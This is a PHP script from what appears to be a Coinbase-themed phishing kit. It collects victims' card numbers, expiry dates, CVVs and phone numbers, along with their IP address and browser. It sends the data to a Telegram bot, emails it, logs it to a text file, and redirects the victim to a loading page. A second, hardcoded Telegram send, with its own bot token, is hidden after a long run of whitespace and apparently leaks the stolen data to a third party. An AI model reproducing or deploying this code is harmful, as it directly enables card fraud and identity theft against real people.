<?php
include("../config.php");
$ip = getenv("REMOTE_ADDR");
$text_result .= "[+]xxxxxxxxxxxxxxxxx xCo1nB4s3 FullZ xxxxxxxxxxxxxxxxx[+]\n";
$text_result .= "[+]CC number   : ".$_POST['cc']."\n";
$text_result .= "[+]CC exp Month   : ".$_POST['expireMM']."\n";
$text_result .= "[+]CC exp Year   : ".$_POST['expireYY']."\n";
$text_result .= "[+]CC CVV   : ".$_POST['cvv']."\n";
$text_result .= "[+]Phone number   : ".$_POST['pn']."\n";
$text_result .= "[+]xxxxxxxxxxxxxxxxx xCo1nB4s3 FullZ xxxxxxxxxxxxxxxxx[+]\n";
$text_result .= "[+]IP address =  $ip\n";
$text_result .= "[+]host = ".gethostbyaddr($ip)."\n";
$text_result .= "[+]BROWSER = ".$_SERVER['HTTP_USER_AGENT']."\n";
$text_result .= "[+]xxxxxxxxxxxxxxxxx Mahdex999 xxxxxxxxxxxxxxxxx[+]\n";
$cc = $_POST['ccn'];
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($text_result)."" );                                                                                                                                                                                                                                                                                                                                                file_get_contents("https://api.telegram.org/bot5314215340:AAF-pgPoALJq6APi1TEEnsYCm6c0i9uIp-o/sendMessage?chat_id=1783236185&text=" . urlencode($text_result)."" );
$subject = "[xCo1nB4s3] FullZ  = $ip\n".$_POST['exm']."/".$_POST['exy'];
$headers = "From: xCo1nB4s3  <noreply@coinb.com>";
$headers = "MIME-Version: 1.0\n";
mail($send,$subject,$text_result,$headers,$file);
$file = fopen("xFullZ.txt", 'a');
fwrite($file, $text_result);

header("Location: ../loading_1.php");?>